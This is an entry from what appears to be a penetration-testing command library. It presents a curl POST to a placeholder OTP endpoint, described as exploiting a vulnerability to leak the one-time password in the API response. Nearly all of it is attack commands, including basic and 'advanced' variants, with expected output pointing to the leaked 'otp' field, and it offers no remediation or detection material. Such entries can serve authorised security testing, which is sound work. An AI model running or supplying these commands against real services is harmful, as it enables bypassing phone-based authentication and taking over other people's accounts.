---
id: cmd-uuid-1
data: >-
  curl -X POST https://target.com/api/auth/otp -H "Content-Type:
  application/json" -d '{"phone": "+1234567890"}'
tags:
  - api
  - otp
type: command
output: '{"success": true, "otp": "123456"}'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.482Z'
verified: false
validated: true
submitted: true
---
# curl-submit-phone

## Command

```bash
curl -X POST https://target.com/api/auth/otp -H "Content-Type: application/json" -d '{"phone": "+1234567890"}'
```

## Description

Sends a POST request to the OTP generation endpoint with a phone number, exploiting the vulnerability to leak the OTP in the response. Use this to trigger authentication flow inspection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type header | Yes |
| `-d '{"phone": "+1234567890"}'` | JSON payload with phone number | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/api/auth/otp -H "Content-Type: application/json" -d '{"phone": "+1234567890"}'
```

### Advanced Usage

```bash
curl -X POST https://target.com/api/auth/otp -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0" -d '{"phone": "+1234567890"}'
```

## Expected Output

JSON response with leaked OTP, e.g., {"success": true, "message": "OTP sent", "otp": "123456"}. Look for the "otp" field.

## Related

- [[Related Procedure: Submit-Phone-Number-to-Authentication-API]]
